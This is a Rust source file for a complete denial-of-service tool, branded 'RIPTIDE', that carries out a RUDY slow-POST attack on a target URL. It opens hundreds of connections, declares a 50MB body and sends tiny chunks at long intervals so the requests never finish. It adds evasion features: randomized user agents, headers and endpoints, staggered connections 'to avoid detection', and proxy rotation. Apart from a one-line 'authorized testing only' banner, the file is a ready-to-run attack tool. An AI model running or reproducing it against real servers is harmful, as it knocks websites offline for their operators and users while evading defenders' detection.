use clap::Parser;
use colored::Colorize;
use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use std::io::{self, Write};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{interval, sleep};
use tracing::{error, info, warn};
use url::Url;

#[derive(Parser, Clone)]
#[command(name = "rudy_attack_v2")]
#[command(about = "Advanced Slow POST (RUDY) attack for authorized security testing")]
struct Args {
    #[arg(short, long, help = "Target URL (e.g., https://example.com)")]
    target: String,
    
    #[arg(short, long, default_value = "800", help = "Number of concurrent connections")]
    connections: usize,
    
    #[arg(short, long, default_value = "600", help = "Attack duration in seconds")]
    duration: u64,
    
    #[arg(long, default_value = "10", help = "POST data send interval in seconds")]
    post_interval: u64,
    
    #[arg(long, default_value = "100", help = "Chunk size in bytes")]
    chunk_size: usize,
    
    #[arg(long, default_value = "true", help = "Enable random user agents")]
    random_ua: bool,
    
    #[arg(long, default_value = "true", help = "Enable advanced evasion")]
    evasion_mode: bool,
    
    #[arg(long, default_value = "false", help = "Enable proxy rotation")]
    proxy_rotation: bool,
    
    #[arg(long, default_value = "200", help = "Connection delay in milliseconds")]
    connection_delay: u64,
    
    #[arg(long, default_value = "52428800", help = "Total content length in bytes (default: 50MB)")]
    content_length: usize,
    
    #[arg(long, default_value = "/upload", help = "Target endpoint for POST")]
    endpoint: String,
    
    #[arg(long, default_value = "true", help = "Use random endpoints")]
    random_endpoints: bool,
    
    #[arg(long, help = "Proxy list file for rotation")]
    proxy_file: Option<String>,
}

// Realistic browser user agents
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
];

// Common upload endpoints for realistic attacks
#[allow(dead_code)]
const COMMON_UPLOAD_ENDPOINTS: &[&str] = &[
    "/upload", "/api/upload", "/file/upload", "/files/upload", "/media/upload",
    "/admin/upload", "/wp-admin/upload.php", "/upload.php", "/upload.jsp",
    "/upload.asp",
    "/api/files", "/api/media", "/submit", "/post", "/create", "/api/create",
    "/form/submit", "/contact/submit", "/feedback", "/api/comment",
];

// Upload endpoints for random endpoint selection
const UPLOAD_ENDPOINTS: &[&str] = &[
    "/upload", "/api", "/submit", "/login", "/register"
];

// Content types for realistic POST requests
const CONTENT_TYPES: &[&str] = &[
    "multipart/form-data; boundary=----WebKitFormBoundary",
    "application/x-www-form-urlencoded",
    "application/json; charset=utf-8",
    "text/plain; charset=utf-8",
    "application/octet-stream",
];

fn get_random_user_agent() -> &'static str {
    let mut rng = StdRng::from_entropy();
    USER_AGENTS[rng.gen_range(0..USER_AGENTS.len())]
}

fn get_random_endpoint() -> &'static str {
    let mut rng = StdRng::from_entropy();
    UPLOAD_ENDPOINTS[rng.gen_range(0..UPLOAD_ENDPOINTS.len())]
}

fn get_random_content_type() -> &'static str {
    let mut rng = StdRng::from_entropy();
    CONTENT_TYPES[rng.gen_range(0..CONTENT_TYPES.len())]
}

fn generate_random_boundary() -> String {
    use rand::distributions::Alphanumeric;
    let mut rng = rand::thread_rng();
    let boundary: String = (0..16)
        .map(|_| rng.sample(Alphanumeric) as char)
        .collect();
    format!("----WebKitFormBoundary{}", boundary)
}

fn generate_random_data(size: usize) -> Vec<u8> {
    use rand::distributions::Alphanumeric;
    let mut rng = rand::thread_rng();
    (0..size)
        .map(|_| rng.sample(Alphanumeric) as u8)
        .collect()
}

fn generate_multipart_chunk(boundary: &str, chunk_num: usize, data: &[u8]) -> Vec<u8> {
    let mut chunk = Vec::new();
    
    if chunk_num == 0 {
        // First chunk with headers
        chunk.extend_from_slice(format!(
            "--{}\r\n\
             Content-Disposition: form-data; name=\"file\"; filename=\"upload_{}.jpg\"\r\n\
             Content-Type: image/jpeg\r\n\r\n",
            boundary, chunk_num
        ).as_bytes());
    }
    
    chunk.extend_from_slice(data);
    chunk.extend_from_slice(b"\r\n");
    
    chunk
}

fn generate_form_data_chunk(chunk_num: usize, data: &[u8]) -> Vec<u8> {
    let mut chunk = Vec::new();
    
    if chunk_num == 0 {
        // Start of form data
        chunk.extend_from_slice(b"data=");
    }
    
    chunk.extend_from_slice(data);
    
    chunk
}

async fn create_rudy_connection(
    target: &str,
    connection_id: usize,
    args: &Args,
    proxies: Option<Vec<String>>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let url = Url::parse(target)?;
    let host = url.host_str().ok_or("Invalid host")?;
    let port = url.port_or_known_default().ok_or("Unknown port")?;
    
    let endpoint = if args.random_endpoints {
        get_random_endpoint()
    } else {
        &args.endpoint
    };
    
    // Create TCP connection with proxy support
    let stream = if args.proxy_rotation && proxies.is_some() {
        // Use proxy rotation
        let proxy_list = proxies.as_ref().unwrap();
        if let Some(proxy) = get_random_proxy(proxy_list) {
            info!("RUDY connection {} using proxy: {}", connection_id, proxy);
            connect_through_proxy(proxy, host, port).await?
        } else {
            warn!("No proxies available, falling back to direct connection");
            TcpStream::connect(format!("{}:{}", host, port)).await?
        }
    } else if args.evasion_mode {
        // Direct connection with evasion
        let socket = tokio::net::TcpSocket::new_v4()?;
        socket.set_nodelay(true)?;
        
        match TcpStream::connect(format!("{}:{}", host, port)).await {
            Ok(mut stream) => {
                // Set TCP options for evasion
                stream.set_nodelay(false)?;
                // Note: set_keepalive is not available on all platforms
                // stream.set_keepalive(Some(Duration::from_millis(5000)))?;
                
                // Build user agent and content type
                let user_agent = if args.random_ua {
                    get_random_user_agent()
                } else {
                    USER_AGENTS[0]
                };
                
                let content_type = if args.evasion_mode {
                    let ct = get_random_content_type();
                    if ct.starts_with("multipart/form-data") {
                        format!("{}{}", ct, generate_random_boundary())
                    } else {
                        ct.to_string()
                    }
                } else {
                    "application/x-www-form-urlencoded".to_string()
                };
                
                // Build POST request headers with dynamic content length
                let mut request = format!(
                    "POST {} HTTP/1.1\r\n\
                     Host: {}\r\n\
                     User-Agent: {}\r\n\
                     Content-Type: {}\r\n\
                     Content-Length: {}\r\n\
                     Connection: keep-alive\r\n\
                     Accept: */*\r\n\
                     Accept-Language: en-US,en;q=0.9\r\n\
                     Accept-Encoding: gzip, deflate, br\r\n",
                    endpoint, host, user_agent, content_type, args.content_length
                );
                
                // Add evasion headers
                if args.evasion_mode {
                    request.push_str(&format!(
                        "Origin: {}\r\n\
                         Referer: {}\r\n\
                         X-Requested-With: XMLHttpRequest\r\n\
                         Cache-Control: no-cache\r\n\
                         Pragma: no-cache\r\n\r\n",
                        target, target
                    ));
                } else {
                    request.push_str("\r\n");
                }
                
                // Send headers
                stream.write_all(request.as_bytes()).await?;
                
                // Small delay to ensure headers are processed
                sleep(Duration::from_millis(100)).await;
                
                stream
            }
            Err(e) => return Err(e.into()),
        }
    } else {
        // Simple direct connection
        TcpStream::connect(format!("{}:{}", host, port)).await?
    };
    
    let mut stream = stream;
    
    // If we haven't sent headers yet (non-evasion mode), send them now
    if !args.evasion_mode || (args.proxy_rotation && proxies.is_some()) {
        // Build user agent and content type
        let user_agent = if args.random_ua {
            get_random_user_agent()
        } else {
            USER_AGENTS[0]
        };
        
        let content_type = if args.evasion_mode {
            let ct = get_random_content_type();
            if ct.starts_with("multipart/form-data") {
                format!("{}{}", ct, generate_random_boundary())
            } else {
                ct.to_string()
            }
        } else {
            "application/x-www-form-urlencoded".to_string()
        };
        
        // Build POST request headers with dynamic content length
        let mut request = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             User-Agent: {}\r\n\
             Content-Type: {}\r\n\
             Content-Length: {}\r\n\
             Connection: keep-alive\r\n\
             Accept: */*\r\n\
             Accept-Language: en-US,en;q=0.9\r\n\
             Accept-Encoding: gzip, deflate, br\r\n",
            endpoint, host, user_agent, content_type, args.content_length
        );
        
        // Add evasion headers
        if args.evasion_mode {
            request.push_str(&format!(
                "Origin: {}\r\n\
                 Referer: {}\r\n\
                 X-Requested-With: XMLHttpRequest\r\n\
                 Cache-Control: no-cache\r\n\
                 Pragma: no-cache\r\n\r\n",
                target, target
            ));
        } else {
            request.push_str("\r\n");
        }
        
        // Send headers
        stream.write_all(request.as_bytes()).await?;
    }
    
    info!("RUDY connection {} established to {}", connection_id, endpoint);
    
    // Send data in small chunks slowly
    let mut interval = interval(Duration::from_secs(args.post_interval));
    let mut bytes_sent = 0;
    let mut chunk_num = 0;
    
    while bytes_sent < args.content_length {
        tokio::select! {
            _ = sleep(Duration::from_secs(args.duration)) => {
                break;
            }
            _ = interval.tick() => {
                let chunk_data = generate_random_data(args.chunk_size);
                let chunk_to_send = if args.evasion_mode {
                    let boundary = extract_boundary(&get_random_content_type());
                    generate_multipart_chunk(&boundary, chunk_num, &chunk_data)
                } else {
                    generate_form_data_chunk(chunk_num, &chunk_data)
                };
                
                if let Err(e) = stream.write_all(&chunk_to_send).await {
                    warn!("RUDY connection {} lost: {}", connection_id, e);
                    break;
                }
                
                bytes_sent += chunk_to_send.len();
                chunk_num += 1;
                
                if chunk_num % 10 == 0 {
                    info!("RUDY connection {}: Sent {} bytes in {} chunks", 
                          connection_id, bytes_sent, chunk_num);
                }
                
                // Random delay for evasion
                if args.evasion_mode {
                    let extra_delay = {
                        let mut rng = rand::thread_rng();
                        rng.gen_range(0..args.post_interval / 2)
                    };
                    sleep(Duration::from_secs(extra_delay)).await;
                }
            }
        }
    }
    
    // Never complete the request (that's the point of RUDY)
    info!("RUDY connection {} completed - leaving connection open", connection_id);
    
    // Keep connection open for remaining duration
    sleep(Duration::from_secs(args.duration)).await;
    
    Ok(())
}

// Helper function to extract boundary from content type
fn extract_boundary(content_type: &str) -> String {
    if let Some(boundary_part) = content_type.split("boundary=").nth(1) {
        boundary_part.to_string()
    } else {
        generate_random_boundary()
    }
}

// Load proxies from file for rotation
fn load_proxies(proxy_file: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    use std::fs::File;
    use std::io::{self, BufRead};
    
    let mut proxies = Vec::new();
    
    if let Ok(file) = File::open(proxy_file) {
        for line in io::BufReader::new(file).lines() {
            if let Ok(proxy) = line {
                let proxy = proxy.trim();
                if !proxy.is_empty() && !proxy.starts_with('#') {
                    proxies.push(proxy.to_string());
                }
            }
        }
    }
    
    if proxies.is_empty() {
        return Err("No valid proxies found".into());
    }
    
    Ok(proxies)
}

// Get random proxy from list
fn get_random_proxy(proxies: &[String]) -> Option<&String> {
    if proxies.is_empty() {
        return None;
    }
    
    let mut rng = StdRng::from_entropy();
    Some(&proxies[rng.gen_range(0..proxies.len())])
}

// Connect through proxy
async fn connect_through_proxy(
    proxy: &str,
    target_host: &str,
    target_port: u16,
) -> Result<TcpStream, Box<dyn std::error::Error + Send + Sync>> {
    let proxy_parts: Vec<&str> = proxy.split(':').collect();
    if proxy_parts.len() != 2 {
        return Err("Invalid proxy format. Use IP:PORT".into());
    }
    
    let proxy_host = proxy_parts[0];
    let proxy_port: u16 = proxy_parts[1].parse()
        .map_err(|_| "Invalid proxy port")?;
    
    // Connect to proxy
    let mut stream = TcpStream::connect(format!("{}:{}", proxy_host, proxy_port)).await?;
    
    // Send CONNECT request
    let connect_request = format!(
        "CONNECT {}:{} HTTP/1.1\r\n\
         Host: {}:{}\r\n\
         Proxy-Connection: Keep-Alive\r\n\r\n",
        target_host, target_port, target_host, target_port
    );
    
    stream.write_all(connect_request.as_bytes()).await?;
    
    // Read response
    let mut response = [0u8; 1024];
    let bytes_read = stream.read(&mut response).await?;
    
    let response_str = String::from_utf8_lossy(&response[..bytes_read]);
    if !response_str.starts_with("HTTP/1.1 200") && !response_str.starts_with("HTTP/1.0 200") {
        return Err(format!("Proxy connection failed: {}", response_str).into());
    }
    
    Ok(stream)
}

// Progressive banner display with interactive prompts
async fn display_progressive_banner(args: &Args) {
    println!();
    println!("{}", "╔═══════════════════════════════════════════════════════════════════════════╗".bright_blue().bold());
    println!("{}", "║                                                                           ║".bright_blue());
    
    // Animated title
    let title_lines = vec![
        "    ██████╗ ██╗██████╗ ████████╗██╗██████╗ ███████╗",
        "    ██╔══██╗██║██╔══██╗╚══██╔══╝██║██╔══██╗██╔════╝",
        "    ██████╔╝██║██████╔╝   ██║   ██║██║  ██║█████╗  ",
        "    ██╔══██╗██║██╔═══╝    ██║   ██║██║  ██║██╔══╝  ",
        "    ██║  ██║██║██║        ██║   ██║██████╔╝███████╗",
        "    ╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚═╝╚═════╝ ╚══════╝",
    ];
    
    for line in &title_lines {
        print!("{}", "║".bright_blue());
        for ch in line.chars() {
            print!("{}", ch.to_string().bright_cyan().bold());
            io::stdout().flush().unwrap();
            tokio::time::sleep(Duration::from_micros(300)).await;
        }
        println!("{}", "║".bright_blue());
    }
    
    println!("{}", "║                                                                           ║".bright_blue());
    println!("{}{}{}",
        "║  ".bright_blue(),
        "R-U-DEAD-YET (RUDY) SLOW POST ATTACK FRAMEWORK".bright_white().bold(),
        "                  ║".bright_blue()
    );
    println!("{}", "║                                                                           ║".bright_blue());
    println!("{}{}{}",
        "║  ".bright_blue(),
        format!("Version: {} | Author: khaninkali", "9.20.2091vproAlpha".bright_yellow()),
        "                      ║".bright_blue()
    );
    println!("{}", "║                                                                           ║".bright_blue());
    println!("{}", "╠═══════════════════════════════════════════════════════════════════════════╣".bright_blue().bold());
    
    // System info
    let os = std::env::consts::OS;
    let arch = std::env::consts::ARCH;
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    
    println!("{}{}{}",
        "║  ".bright_blue(),
        format!("System: {} ({})", os, arch).bright_magenta(),
        "                                                      ║".bright_blue()
    );
    println!("{}{}{}",
        "║  ".bright_blue(),
        format!("Hostname: {}", hostname).bright_magenta(),
        format!("{}", " ".repeat(62 - hostname.len()) + "║").bright_blue()
    );
    println!("{}{}{}",
        "║  ".bright_blue(),
        "Mode: Slow POST Attack (RUDY)".bright_green().bold(),
        "                                       ║".bright_blue()
    );
    println!("{}", "║                                                                           ║".bright_blue());
    println!("{}", "╠═══════════════════════════════════════════════════════════════════════════╣".bright_blue().bold());
    
    // Warning
    println!("{}", "║                                                                           ║".bright_blue());
    println!("{}{}{}",
        "║  ".bright_blue(),
        "⚠  WARNING: Authorized Security Testing Only".bright_red().bold(),
        "                          ║".bright_blue()
    );
    println!("{}{}{}",
        "║  ".bright_blue(),
        "   Unauthorized use may violate laws and regulations".bright_white(),
        "                    ║".bright_blue()
    );
    println!("{}", "║                                                                           ║".bright_blue());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════════════╝".bright_blue().bold());
    println!();
    
    // Loading animation
    print!("{}", "[*] Initializing RUDY attack engine".bright_white());
    for _ in 0..3 {
        tokio::time::sleep(Duration::from_millis(400)).await;
        print!("{}", ".".bright_white());
        io::stdout().flush().unwrap();
    }
    println!(" {}", "[READY]".bright_green().bold());
    println!();
    
    // Configuration display
    println!("{}", "═══════════════════════════════════════════════════════════════════════════".bright_blue());
    println!("{}  {}", "  Configuration".bright_cyan().bold(), "Details".bright_cyan().bold());
    println!("{}", "═══════════════════════════════════════════════════════════════════════════".bright_blue());
    println!("  {}  {}", "Target:".bright_yellow(), args.target.white());
    println!("  {}  {}", "Connections:".bright_yellow(), args.connections.to_string().white());
    println!("  {}  {} seconds", "Duration:".bright_yellow(), args.duration.to_string().white());
    println!("  {}  {} bytes", "Chunk Size:".bright_yellow(), args.chunk_size.to_string().white());
    println!("  {}  {} bytes ({}MB)", "Content Length:".bright_yellow(), 
        args.content_length.to_string().white(),
        (args.content_length / 1024 / 1024).to_string().bright_cyan()
    );
    println!("  {}  {}", "Endpoint:".bright_yellow(), args.endpoint.white());
    println!("  {}  {} seconds", "POST Interval:".bright_yellow(), args.post_interval.to_string().white());
    println!("{}", "═══════════════════════════════════════════════════════════════════════════".bright_blue());
    println!();
    
    // Advanced features
    println!("{}", "═══════════════════════════════════════════════════════════════════════════".bright_blue());
    println!("{}  {}", "  Advanced".bright_cyan().bold(), "Features".bright_cyan().bold());
    println!("{}", "═══════════════════════════════════════════════════════════════════════════".bright_blue());
    println!("  {}  {}", "Evasion Mode:".bright_yellow(), 
        if args.evasion_mode { "ENABLED".green().bold() } else { "DISABLED".red() });
    println!("  {}  {}", "Proxy Rotation:".bright_yellow(), 
        if args.proxy_rotation { "ENABLED".green().bold() } else { "DISABLED".red() });
    println!("  {}  {}", "Random User Agents:".bright_yellow(), 
        if args.random_ua { "ENABLED".green().bold() } else { "DISABLED".red() });
    println!("  {}  {}", "Random Endpoints:".bright_yellow(), 
        if args.random_endpoints { "ENABLED".green().bold() } else { "DISABLED".red() });
    println!("{}", "═══════════════════════════════════════════════════════════════════════════".bright_blue());
    println!();
    
    // Interactive confirmation
    print!("{}", "[?] Proceed with RUDY attack? (y/N): ".bright_yellow().bold());
    io::stdout().flush().unwrap();
    
    let confirmed = tokio::task::spawn_blocking(|| {
        let mut input = String::new();
        if io::stdin().read_line(&mut input).is_ok() {
            input.trim().to_lowercase() == "y"
        } else {
            false
        }
    }).await.unwrap_or(false);
    
    if !confirmed {
        println!("{}", "[!] Attack cancelled by user".bright_red());
        std::process::exit(0);
    }
    
    println!();
    
    // Countdown
    println!("{}", "[*] INITIATING ATTACK SEQUENCE".bright_green().bold());
    for i in (1..=3).rev() {
        print!("\r{}  {} {}", 
            "[*]".bright_green(),
            "Starting in".bright_white(),
            format!("{} seconds...", i).bright_yellow()
        );
        io::stdout().flush().unwrap();
        tokio::time::sleep(Duration::from_secs(1)).await;
    }
    println!("\r{}  {}                    ", 
        "[*]".bright_green(),
        "ATTACK INITIATED".bright_green().bold()
    );
    println!();
}

/// Display help for interactive mode
fn display_help() {
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_blue());
    println!("{}  {}", "  Command".bright_yellow().bold(), "Description".bright_yellow().bold());
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_blue());
    println!("  {}      Display this help message", "help".bright_green());
    println!("  {}     Start the RUDY attack", "start".bright_green());
    println!("  {}    Show current configuration", "config".bright_green());
    println!("  {}      Show system information", "info".bright_green());
    println!("  {}     Clear the terminal screen", "clear".bright_green());
    println!("  {}      Exit the application", "exit".bright_green());
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_blue());
    println!();
}

/// Interactive mode with command prompt
async fn interactive_mode(args: Args) -> Result<(), Box<dyn std::error::Error>> {
    // Display banner
    println!();
    println!("{}", "╔═══════════════════════════════════════════════════════════════════════════╗".bright_blue().bold());
    println!("{}", "║                                                                           ║".bright_blue());
    println!("{}{}{}",
        "║  ".bright_blue(),
        "██████╗ ██╗██████╗ ████████╗██╗██████╗ ███████╗".bright_cyan().bold(),
        "                        ║".bright_blue()
    );
    println!("{}{}{}",
        "║  ".bright_blue(),
        "██╔══██╗██║██╔══██╗╚══██╔══╝██║██╔══██╗██╔════╝".bright_cyan().bold(),
        "                        ║".bright_blue()
    );
    println!("{}{}{}",
        "║  ".bright_blue(),
        "██████╔╝██║██████╔╝   ██║   ██║██║  ██║█████╗  ".bright_cyan().bold(),
        "                        ║".bright_blue()
    );
    println!("{}{}{}",
        "║  ".bright_blue(),
        "██╔══██╗██║██╔═══╝    ██║   ██║██║  ██║██╔══╝  ".bright_cyan().bold(),
        "                        ║".bright_blue()
    );
    println!("{}{}{}",
        "║  ".bright_blue(),
        "██║  ██║██║██║        ██║   ██║██████╔╝███████╗".bright_cyan().bold(),
        "                        ║".bright_blue()
    );
    println!("{}{}{}",
        "║  ".bright_blue(),
        "╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚═╝╚═════╝ ╚══════╝".bright_cyan().bold(),
        "                        ║".bright_blue()
    );
    println!("{}", "║                                                                           ║".bright_blue());
    println!("{}{}{}",
        "║  ".bright_blue(),
        format!("RUDY Attack Framework v{}", "9.20.2091vproAlpha".bright_yellow()),
        "                                     ║".bright_blue()
    );
    println!("{}", "╚═══════════════════════════════════════════════════════════════════════════╝".bright_blue().bold());
    println!();
    
    println!("{}", "Type 'help' for available commands or 'start' to begin attack".bright_white().dimmed());
    println!();
    
    loop {
        print!("{}", "riptide> ".bright_blue().bold());
        io::stdout().flush()?;
        
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
        let command = input.trim().to_lowercase();
        
        match command.as_str() {
            "help" => {
                display_help();
            }
            "start" => {
                println!();
                println!("{}", "[*] Starting RUDY attack...".bright_green().bold());
                display_progressive_banner(&args).await;
                
                // Execute attack
                if let Err(e) = execute_rudy_attack(&args).await {
                    println!("{} {}", "[ERROR]".red().bold(), e);
                }
                
                println!();
                println!("{}", "[*] Attack completed".green().bold());
            }
            "config" => {
                println!();
                println!("{}", "═══════════════════════════════════════════════════════".bright_blue());
                println!("{}  Current Configuration", "  ".bright_blue());
                println!("{}", "═══════════════════════════════════════════════════════".bright_blue());
                println!("  {}  {}", "Target:".bright_yellow(), args.target.white());
                println!("  {}  {}", "Connections:".bright_yellow(), args.connections.to_string().white());
                println!("  {}  {} seconds", "Duration:".bright_yellow(), args.duration.to_string().white());
                println!("  {}  {} bytes", "Chunk Size:".bright_yellow(), args.chunk_size.to_string().white());
                println!("  {}  {}", "Evasion Mode:".bright_yellow(), 
                    if args.evasion_mode { "ENABLED".green() } else { "DISABLED".red() });
                println!("{}", "═══════════════════════════════════════════════════════".bright_blue());
                println!();
            }
            "info" => {
                println!();
                println!("{}", "═══════════════════════════════════════════════════════".bright_blue());
                println!("{}  System Information", "  ".bright_blue());
                println!("{}", "═══════════════════════════════════════════════════════".bright_blue());
                println!("  {}  {}", "OS:".bright_yellow(), std::env::consts::OS.white());
                println!("  {}  {}", "Architecture:".bright_yellow(), std::env::consts::ARCH.white());
                println!("  {}  {}", "Version:".bright_yellow(), "9.20.2091vproAlpha".white());
                println!("  {}  {}", "Mode:".bright_yellow(), "RUDY Slow POST".bright_green());
                println!("{}", "═══════════════════════════════════════════════════════".bright_blue());
                println!();
            }
            "clear" => {
                print!("\x1B[2J\x1B[1;1H");
                io::stdout().flush()?;
            }
            "exit" | "quit" => {
                println!();
                println!("{}", "[*] Shutting down RIPTIDE...".bright_yellow());
                tokio::time::sleep(Duration::from_millis(500)).await;
                println!("{}", "[*] Goodbye!".green().bold());
                println!();
                break;
            }
            "" => {
                // Empty input
            }
            _ => {
                println!("{} '{}'", "[ERROR] Unknown command:".red().bold(), command.white());
                println!("  Type {} for available commands", "help".bright_green());
            }
        }
    }
    
    Ok(())
}

/// Execute the RUDY attack
async fn execute_rudy_attack(args: &Args) -> Result<(), Box<dyn std::error::Error>> {
    // Load proxies if proxy rotation is enabled
    let proxies = if args.proxy_rotation {
        match &args.proxy_file {
            Some(proxy_file) => {
                match load_proxies(proxy_file) {
                    Ok(proxies) => {
                        println!("{} Loaded {} proxies for rotation", "[+]".green(), proxies.len());
                        Some(proxies)
                    }
                    Err(e) => {
                        return Err(format!("Failed to load proxies: {}", e).into());
                    }
                }
            }
            None => {
                return Err("Proxy rotation enabled but no proxy file specified".into());
            }
        }
    } else {
        None
    };
    
    let mut handles = Vec::new();
    
    // Create concurrent connections with staggered timing
    for i in 0..args.connections {
        let target = args.target.clone();
        let args_clone = args.clone();
        let proxies_clone = proxies.clone();
        
        let handle = tokio::spawn(async move {
            if let Err(e) = create_rudy_connection(&target, i, &args_clone, proxies_clone).await {
                error!("RUDY connection {} failed: {}", i, e);
            }
        });
        
        handles.push(handle);
        
        // Stagger connections to avoid detection
        if args.connection_delay > 0 {
            sleep(Duration::from_millis(args.connection_delay)).await;
        }
    }
    
    info!("All {} RUDY connections initiated - sending slow POST data...", args.connections);
    
    // Wait for attack completion
    sleep(Duration::from_secs(args.duration)).await;
    
    info!("RUDY attack completed - connections left open");
    
    // Wait for all connections to finish
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("{} RUDY Attack completed successfully", "[+]".green().bold());
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt::init();
    
    // Check if running in interactive mode (no arguments provided)
    if std::env::args().len() <= 1 {
        // Create default args for interactive mode
        let args = Args {
            target: String::new(),
            connections: 800,
            duration: 600,
            post_interval: 10,
            chunk_size: 100,
            random_ua: true,
            evasion_mode: true,
            proxy_rotation: false,
            connection_delay: 200,
            content_length: 52428800,
            endpoint: "/upload".to_string(),
            random_endpoints: true,
            proxy_file: None,
        };
        return interactive_mode(args).await;
    }
    
    let args = Args::parse();
    
    // Check if target is provided (interactive mode if not)
    if args.target.is_empty() {
        return interactive_mode(args).await;
    }
    
    // Progressive banner display with interactive prompts
    display_progressive_banner(&args).await;
    
    // Execute attack
    execute_rudy_attack(&args).await?;
    
    Ok(())
}
